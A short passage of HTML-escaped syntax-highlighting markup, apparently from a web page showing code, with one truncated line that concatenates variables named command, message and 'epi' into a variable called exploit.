&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exploit&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;command&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;message&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;epi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
